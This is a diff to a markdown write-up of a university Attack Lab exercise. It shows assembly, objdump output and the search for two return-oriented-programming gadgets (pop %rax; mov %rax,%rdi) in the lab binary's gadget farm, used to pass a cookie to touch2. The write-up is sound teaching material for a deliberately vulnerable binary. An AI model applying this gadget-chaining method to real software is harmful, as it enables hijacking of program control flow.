@@ -292,8 +292,33 @@ set value of `%rdi` by our cookie. The instructions we will execute can be:
   movq %rax, %rdi    # 2nd gadget, copy value from register rax to rdi 
   retq               # correctly set stack value heading to <touch2>
 ```
-According to the instruction guidance table, we know the machine code of this part is:
+Now we check the machine code of this part is:
+```bash
+  03-Attack-Lab/src > gcc -c rtarget.code.l2.s
+  03-Attack-Lab/src > objdump -d rtarget.code.l2.o > rtarget.code.l2.d
+  03-Attack-Lab/src > cat ctarget.code.l2.d
+    rtarget.code.l2.o:     file format elf64-x86-64
+    Disassembly of section .text:
+    0000000000000000 <.text>:
+       0:   58                      pop    %rax
+       1:   c3                      retq
+       2:   48 89 c7                mov    %rax,%rdi
+       5:   c3                      retq
 ```
+So the task becomes locating two gadgets ` 58 c3 ` and ` 48 89 c7 c3` in our gadget farm. Notice
+that it is allowed any number of `90`, the machine code of `nop` instruction, before the `c3`.
+Fortunately, we find the first gadget in `<getval_280>` with a sequence of `58 90 c3` and a second
+gadget in `<addval_273>` with a sequence of `48 89 c7 c3`.
+```asm
+### first gadget ###
+00000000004019ca <getval_280>:
+  4019ca:   b8 29 58 90 c3          mov    $0xc3905829,%eax
+  4019cf:   c3                      retq
+
+### second gadget ###
+00000000004019a0 <addval_273>:
+  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
+  4019a6:   c3
 ```
 
 ## Level 3
